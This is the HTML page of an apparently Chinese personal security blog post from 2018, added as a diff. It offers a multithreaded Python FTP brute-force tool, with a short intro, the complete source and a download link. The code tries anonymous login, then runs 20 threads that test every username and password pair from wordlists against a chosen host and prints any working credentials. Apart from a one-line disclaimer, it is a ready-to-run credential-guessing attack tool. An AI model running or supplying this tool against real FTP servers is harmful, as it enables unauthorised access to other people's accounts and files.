@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Python,工具,爆破,FTP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="仿土司上一位老哥写的FTP爆破工具，修复了一些BUG，添加了多线程。">
+<meta name="keywords" content="Python,工具,爆破,FTP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一款Python多线程-FTP暴力破解工具">
+<meta property="og:url" content="http://yoursite.com/2018/07/12/一款Python多线程-FTP暴力破解工具/index.html">
+<meta property="og:site_name" content="Mr.T&#39;blog">
+<meta property="og:description" content="仿土司上一位老哥写的FTP爆破工具，修复了一些BUG，添加了多线程。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p3ek8hcdl.bkt.clouddn.com/python/image/ftpbrute.png">
+<meta property="og:updated_time" content="2018-07-12T06:52:14.415Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一款Python多线程-FTP暴力破解工具">
+<meta name="twitter:description" content="仿土司上一位老哥写的FTP爆破工具，修复了一些BUG，添加了多线程。">
+<meta name="twitter:image" content="http://p3ek8hcdl.bkt.clouddn.com/python/image/ftpbrute.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/12/一款Python多线程-FTP暴力破解工具/"/>
+
+
+
+
+
+  <title>一款Python多线程-FTP暴力破解工具 | Mr.T'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/zzb1999"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/38ef81f8aca64bb9a64448d0d70f1308ef5341ab/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6461726b626c75655f3132313632312e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mr.T'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大多数人终将平庸的度过一生！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/12/一款Python多线程-FTP暴力破解工具/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mr.T">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr.T'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一款Python多线程-FTP暴力破解工具</h1>
+        
+
+        <div class="post-meta">
+          
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-12T14:32:01+08:00">
+                2018-07-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/工具/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  879 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>仿土司上一位老哥写的FTP爆破工具，修复了一些BUG，添加了多线程。<br><img src="http://p3ek8hcdl.bkt.clouddn.com/python/image/ftpbrute.png" alt=""><a id="more"></a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docs = <span class="string">"""</span></span><br><span class="line"><span class="string">        [*] This was written for educational purpose and pentest only. Use it at your own risk.</span></span><br><span class="line"><span class="string">        [*] Author will be not responsible for any damage!</span></span><br><span class="line"><span class="string">        [*] Toolname        : ftp_brute_laot.py</span></span><br><span class="line"><span class="string">        [*] Coder           : </span></span><br><span class="line"><span class="string">        [*] Version         : 0.1</span></span><br><span class="line"><span class="string">        [*] ample of use  : python ftp_brute_laot.py -t ftp.server.com -u usernames.txt -p passwords.txt</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.platform == <span class="string">'linux'</span> <span class="keyword">or</span> sys.platform == <span class="string">'linux2'</span>:</span><br><span class="line">    clearing = <span class="string">'clear'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    clearing = <span class="string">'cls'</span></span><br><span class="line">os.system(clearing)</span><br><span class="line"></span><br><span class="line">R = <span class="string">"\033[31m"</span></span><br><span class="line">G = <span class="string">"\033[32m"</span></span><br><span class="line">Y = <span class="string">"\033[33m"</span></span><br><span class="line">END = <span class="string">"\033[0m"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logo</span><span class="params">()</span>:</span></span><br><span class="line">    print(G + <span class="string">"\n                |---------------------------------------------------------------|"</span>)</span><br><span class="line">    print(<span class="string">"                |                                                               |"</span>)</span><br><span class="line">    print(<span class="string">"                |                           www.ixysec.com                      |"</span>)</span><br><span class="line">    print(<span class="string">"                |                11/07/2018 ftp_brute_laot.py v.0.1             |"</span>)</span><br><span class="line">    print(<span class="string">"                |                        FTP Brute Forcing Tool                 |"</span>)</span><br><span class="line">    print(<span class="string">"                |                                                               |"</span>)</span><br><span class="line">    print(<span class="string">"                |---------------------------------------------------------------|\n"</span>)</span><br><span class="line">    print(<span class="string">"        \n                 [-] %s\n"</span> % time.strftime(<span class="string">"%X"</span>))</span><br><span class="line">    print(docs + END)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xhelp</span><span class="params">()</span>:</span></span><br><span class="line">    print(R + <span class="string">"[*]-t, --target            ip/hostname     &lt;&gt; Our target"</span>)</span><br><span class="line">    print(<span class="string">"[*]-u, --usernamelist      usernamelist    &lt;&gt; usernamelist path"</span>)</span><br><span class="line">    print(<span class="string">"[*]-p, --passwordlist      passwordlist    &lt;&gt; passwordlist path"</span>)</span><br><span class="line">    print(<span class="string">"[*]-h, --help              help            &lt;&gt; print this help"</span>)</span><br><span class="line">    print(<span class="string">"[*]Example : python ftp_bf -h ftp.server.com -u username.txt -p passwords.txt"</span> + END)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_login</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">            user, pwd = q.get()</span><br><span class="line">        ftp = FTP(host)</span><br><span class="line">        ftp.login(user, pwd)</span><br><span class="line">        ftp.retrlines(<span class="string">'list'</span>)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(Y + <span class="string">"\n[!] w00t,w00t!!! We did it ! "</span>)</span><br><span class="line">        print(<span class="string">"[+] Target : "</span>, host, <span class="string">""</span>)</span><br><span class="line">        print(<span class="string">"[+] User : "</span>, user, <span class="string">""</span>)</span><br><span class="line">        print(<span class="string">"[+] Password : "</span>, pwd, <span class="string">""</span> + END)</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(G + <span class="string">"[+]Attempt uaername:%s password:%s..."</span> % (user, pwd) + R + <span class="string">"Disenable"</span> + END)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(R + <span class="string">"\n[-] Exiting ...\n"</span> + END)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">anonymous_login</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(G + <span class="string">"\n[!] Checking for anonymous login.\n"</span> + END)</span><br><span class="line">        ftp = FTP(host)</span><br><span class="line">        ftp.login()</span><br><span class="line">        ftp.retrlines(<span class="string">"list"</span>)</span><br><span class="line">        print(Y + <span class="string">"\n[!] w00t,w00t!!! Anonymous login successfuly !\n"</span> + END)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(R + <span class="string">"\n[-] Anonymous login failed...\n"</span> + END)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = Queue()</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    logo()</span><br><span class="line">    <span class="comment"># ftp_brute.py -h 127.0.0.1 -p password.txt -u username.txt</span></span><br><span class="line">    <span class="comment"># ['ftp_brute.py', '-h', '127.0.0.1', '-p', 'password.txt', '-u', 'username.txt']</span></span><br><span class="line">    <span class="comment"># print(sys.argv)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> argv <span class="keyword">in</span> sys.argv:</span><br><span class="line">            <span class="keyword">if</span> argv.lower() == <span class="string">"-t"</span> <span class="keyword">or</span> argv.lower() == <span class="string">"--target"</span>:</span><br><span class="line">                host = sys.argv[sys.argv.index(argv) + <span class="number">1</span>]</span><br><span class="line">                <span class="comment"># print(host)</span></span><br><span class="line">            <span class="keyword">elif</span> argv.lower() == <span class="string">"-u"</span> <span class="keyword">or</span> argv.lower() == <span class="string">"--usernamelist"</span>:</span><br><span class="line">                usernamelist = sys.argv[sys.argv.index(argv) + <span class="number">1</span>]</span><br><span class="line">                <span class="comment"># print(usernamelist)</span></span><br><span class="line">            <span class="keyword">elif</span> argv.lower() == <span class="string">"-p"</span> <span class="keyword">or</span> argv.lower() == <span class="string">"--passwordlist"</span>:</span><br><span class="line">                passwordlist = sys.argv[sys.argv.index(argv) + <span class="number">1</span>]</span><br><span class="line">                <span class="comment"># print(passwordlist)</span></span><br><span class="line">            <span class="keyword">elif</span> argv.lower() == <span class="string">"-h"</span> <span class="keyword">or</span> argv.lower() == <span class="string">"--help"</span>:</span><br><span class="line">                xhelp()</span><br><span class="line">            <span class="keyword">elif</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">                xhelp()</span><br><span class="line">    <span class="keyword">except</span> SystemExit:</span><br><span class="line">        print(R+<span class="string">"[-]Cheak your parametars input\n"</span>+END)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        xhelp()</span><br><span class="line">        print(R+<span class="string">"[-]Cheak your parametars input\n"</span>+END)</span><br><span class="line"></span><br><span class="line">    print(G + <span class="string">"[!] BruteForcing target ..."</span> + END)</span><br><span class="line">    anonymous_login(host)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        usernames = open(usernamelist, <span class="string">"r"</span>)</span><br><span class="line">        user = usernames.readlines()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(user)):</span><br><span class="line">            user[i] = user[i].strip()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(R + <span class="string">"\n[-] Cheak your usernamelist path\n"</span> + END)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        passwords = open(passwordlist, <span class="string">"r"</span>)</span><br><span class="line">        pwd = passwords.readlines()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pwd)):</span><br><span class="line">            pwd[i] = pwd[i].strip()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print(R + <span class="string">"\n[-] Cheak your passwordlist path\n"</span> + END)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(G + <span class="string">"\n[+] Loaded:"</span>, len(user), <span class="string">"usernames"</span>)</span><br><span class="line">    print(<span class="string">"\n[+] Loaded:"</span>, len(pwd), <span class="string">"passwords"</span>)</span><br><span class="line">    print(<span class="string">"[+] Target:"</span>, host)</span><br><span class="line">    print(<span class="string">"[+] Guessing...\n"</span> + END)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> user:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> pwd:</span><br><span class="line">            <span class="comment"># result = brute_login(host, u.replace("\n", ""), p.replace("\n", ""))</span></span><br><span class="line">            <span class="comment"># if result != 1:</span></span><br><span class="line">            <span class="comment">#     print(G + "[+]Attempt uaername:%s password:%s..." % (u, p) + R + "Disenable" + END)</span></span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(G + "[+]Attempt uaername:%s password:%s..." % (u, p) + Y + "Enable" + END)</span></span><br><span class="line">            <span class="comment">#     flag = 1</span></span><br><span class="line">            <span class="comment">#     break</span></span><br><span class="line">            q.put([u, p])</span><br><span class="line"></span><br><span class="line">    threadlist = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment"># print("----%d----"%len(threadlist))</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(threadlist) &lt; <span class="number">20</span>:</span><br><span class="line">            t = threading.Thread(target=brute_login, args=(host,))</span><br><span class="line">            t.start()</span><br><span class="line">            threadlist.append(t)</span><br><span class="line">        <span class="keyword">elif</span> len(threadlist) &gt;= <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">for</span> th <span class="keyword">in</span> threadlist:</span><br><span class="line">                th.join()</span><br><span class="line">                threadlist.remove(th)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等所有线程结束</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        print(R + <span class="string">"\n[-]There is no username ans password enabled in the list."</span>)</span><br><span class="line">        print(<span class="string">"[-]Exiting...\n"</span> + END)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>下载地址：<a href="http://p3ek8hcdl.bkt.clouddn.com/file/ftp_brute.rar" target="_blank" rel="noopener">点我下载</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="Mr.T 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="Mr.T 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Python/" rel="tag"><i class="fa fa-tag"></i> Python</a>
+          
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+            <a href="/tags/爆破/" rel="tag"><i class="fa fa-tag"></i> 爆破</a>
+          
+            <a href="/tags/FTP/" rel="tag"><i class="fa fa-tag"></i> FTP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/09/临时解决kali中文件拖不出来的小技巧/" rel="next" title="临时解决kali中文件拖不出来的小技巧">
+                <i class="fa fa-chevron-left"></i> 临时解决kali中文件拖不出来的小技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzczNy8xMDI5MQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.png"
+                alt="Mr.T" />
+            
+              <p class="site-author-name" itemprop="name">Mr.T</p>
+              <p class="site-description motion-element" itemprop="description">web安全，渗透测试，PHP，Python，java。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mr.T</span>
+
+  
+</div>
+<div class="busuanzi-count">
+  <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv">1081</span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv">2439</span>
+      
+    </span>
+  
+</div>
+
+
+<!-- 
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+-->
+
+
+
+<!-- 
+  <span class="post-meta-divider">|</span>
+  -->
+
+
+
+<!--
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+ -->
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
